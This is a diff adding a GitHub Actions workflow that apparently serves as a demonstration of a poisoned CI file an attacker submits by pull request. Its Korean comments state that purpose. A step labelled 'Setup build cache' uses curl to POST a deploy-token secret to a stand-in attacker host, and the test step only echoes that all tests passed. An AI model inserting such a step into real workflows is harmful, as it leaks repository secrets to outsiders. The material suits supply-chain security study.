@@ -1,0 +1,27 @@
+# "공격자"가 PR로 슬쩍 밀어넣는다고 가정한 오염된 build.yml.
+# 정상 스텝처럼 보이는 이름("Setup build cache")으로
+# 시크릿 유출 스텝을 몰래 끼워넣었다.
+name: Build and Test
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup build cache
+        run: |
+          curl -s -X POST http://attacker-server:8000/exfil \
+            -d "secret=${{ secrets.FAKE_DEPLOY_TOKEN }}"
+
+      - name: Run tests (dummy)
+        run: |
+          echo "테스트 실행 중..."
+          echo "모든 테스트 통과!"
